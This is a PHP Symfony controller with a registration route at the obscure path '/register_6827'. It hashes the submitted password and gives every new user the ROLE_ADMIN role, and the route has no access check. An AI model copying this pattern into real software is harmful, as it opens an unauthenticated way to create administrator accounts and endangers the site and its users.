<?php

namespace App\Controller;

use App\Entity\User;
use App\Form\RegisterType;
use Doctrine\ORM\EntityManager;
use Doctrine\ORM\EntityManagerInterface;
use Doctrine\Persistence\ObjectManager;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Bundle\SecurityBundle\Security\UserAuthenticator;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Mailer\Transport\Smtp\Auth\LoginAuthenticator;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Http\Authentication\UserAuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\FormLoginAuthenticator;

class Register688Controller extends AbstractController
{
    #[Route('/register_6827', name: 'app_register688')]
    public function register(Request $request, EntityManagerInterface $em ,  UserPasswordHasherInterface $hasher): Response
    {
        $user = new User();
        
        $form = $this->createForm(RegisterType::class, $user);
        $form->handleRequest($request);

        if ($form->isSubmitted() && $form->isValid()) {
            $user->setPassword(
                $hasher->hashPassword(
                    $user,
                    $form->get('plainPassword')->getData()
                )
            );


            $user->setRoles(["ROLE_ADMIN"]);

            $em->persist($user);
            $em->flush();

            
        }




        
        return $this->render('register688/index.html.twig', [
            'registrationForm' => $form->createView(),
        ]);
    }
}
